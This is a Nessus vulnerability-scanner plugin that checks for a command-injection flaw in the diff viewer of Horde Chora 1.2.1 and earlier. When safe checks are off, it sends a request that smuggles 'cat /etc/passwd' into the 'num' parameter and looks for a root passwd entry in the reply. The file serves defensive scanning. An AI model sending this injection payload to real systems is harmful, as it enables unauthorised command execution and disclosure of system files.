#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#


include("compat.inc");

if (description) {
  script_id(12281);
  script_bugtraq_id(10531);
  script_version ("$Revision: 1.13 $");
  script_osvdb_id(7005);
  script_xref(name:"GLSA", value:"GLSA 200406-09");

  script_name(english:"Horde Chora CVS Viewer diff Utility Arbitrary Command Execution");

 script_set_attribute(attribute:"synopsis", value:
"The remote web application has a command execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote server is running at least one instance of Chora version
1.2.1 or earlier.  Such versions have a flaw in the diff viewer that
enables a remote attacker to run arbitrary code with the permissions of
the web user." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?456a75d6" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Chora version 1.2.2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/06/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/06/13");
 script_cvs_date("$Date: 2011/03/17 01:57:37 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for remote code execution vulnerability in Chora";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2011 George A. Theall");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("chora_detect.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/chora");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);

# This function finds a file in CVS, recursing directories if necessary.
# Args:
#   - basedir is the web path to cvs.php
#   - cvsdir is the CVS directory to look in.
# Return:
#   - filename of the first file it finds in CVS or an empty 
#     string if none can be located.
function find_cvsfile(basedir, cvsdir) {
  local_var url, req, res, pat, matches, m, files, dirs, file;

  url = string(basedir, "/cvs.php", cvsdir);
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) return "";           # can't connect

  if (egrep(string:res, pattern:"^HTTP/.* 200 OK")) {
    # Identify files.
    pat = "/co\.php/.*(/.+)\?r=";
    matches = egrep(string:res, pattern:pat);
    if (!isnull(matches)) {
      foreach m (split(matches)) {
        files = eregmatch(string:m, pattern:pat);
        if (!isnull(files)) {
          # Return the first file we find.
          return(string(cvsdir, files[1]));
        }
      }
    }

    # Identify directories and recurse into each until we find a file.
    pat = "folder\.gif[^>]+>&nbsp;([^<]+)/</a>";
    matches = egrep(string:res, pattern:pat);
    if (!isnull(matches)) {
      foreach m (split(matches)) {
        dirs = eregmatch(string:m, pattern:pat);
        if (!isnull(dirs)) {
          file = find_cvsfile(basedir:basedir, cvsdir:string(cvsdir, "/", dirs[1]));
          if (!isnull(file)) return(file);
        }
      }
    }
  }
}

# Check each installed instance, stopping if we find a vulnerability.
entries = get_kb_list(string("www/", port, "/chora"));
if (isnull(entries)) exit(0);
foreach entry (entries) {
  matches = eregmatch(string:entry, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];

    # If safe_checks is enabled, rely on the version number alone.
    if (safe_checks()) {
      if (ereg(pattern:"^(0\.|1\.(0\.|1\.|2|2\.1))(-(cvs|ALPHA))$", string:ver)) {
        security_hole(port);
        exit(0);
      }
    }
    # Else, try an exploit.
    else {
      file = find_cvsfile(basedir:dir, cvsdir:"");
      if (!isnull(file)) {
        # nb: I'm not sure 1.1 will always be available; it might
        #     be better to pull revision numbers from chora.
        rev = "1.1";
        url = string(
          dir, "/diff.php", file, 
          "?r1=", rev, 
          "&r2=", rev,
          # nb: setting the type to "context" lets us see the output
          "&ty=c",
          #     and for a PoC we'll grab /etc/passwd.
          "&num=3;cat%20/etc/passwd;"
        );
        req = http_get(item:url, port:port);
        res = http_keepalive_send_recv(port:port, data:req);
        if (res == NULL) exit(0);           # can't connect

        # Trouble if there's a line like root's passwd entry in the results.
        if (egrep(string:res, pattern:"root:.+:0:")) {
          security_hole(port);
          exit(0);
        }
      }
    }
  }
}
